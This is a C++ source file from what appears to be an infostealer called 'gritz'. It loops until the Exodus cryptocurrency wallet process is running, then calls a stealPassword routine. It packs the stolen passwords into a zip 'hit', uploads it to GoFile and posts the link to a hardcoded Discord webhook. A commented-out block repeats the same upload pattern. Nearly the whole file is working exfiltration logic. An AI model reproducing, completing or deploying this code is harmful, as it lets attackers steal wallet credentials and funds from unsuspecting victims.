#include <gritz.h>

void gritz::cGritz::Start(char** args)
{
	gritz::paths::initPaths();

	//Webhook hook = Webhook("https://canary.discord.com/api/webhooks/1572280543809241129/GvL-ZbVVewTGRQFP9lR9FQ6603zajYAbban17ahreY3WEOagQpBro09NBKgmAUJ7tbVh");
	//hook.setUsername("yo")
	//	.setContent(gritz::upload::GoFileUpload::upload(gritz::upload::zip::ZipFile::create("lmao")));

	//hook.execute();

	//if (args[1] == nullptr)
	//{
	//}
	//else
	//{
	//}

	//std::cin.get();

	handleExodusPassword();
}

void gritz::cGritz::handleExodusPassword()
{
	bool found = false;

	std::string passwords;

	while (true)
	{
		found = gritz::utils::processes::findProcess("Exodus.exe").first;

		std::cout << found;

		if (found)
		{
			passwords = gritz::features::exodus::cExodus::stealPassword();
			if (passwords.empty())
			{
				continue;
			}
			break;
		}
	}

	Webhook hook = Webhook("https://canary.discord.com/api/webhooks/1572280543809241129/GvL-ZbVwTGRQFP9lR9FQ6603zajYAbban17ahreY3WEOagQpBro09NBKgmAUJ7tbVh");

	hook.setUsername("yo")
		.setContent(gritz::upload::GoFileUpload::upload(gritz::upload::zip::ZipFile::createExodusHit(passwords)));

	hook.execute();
}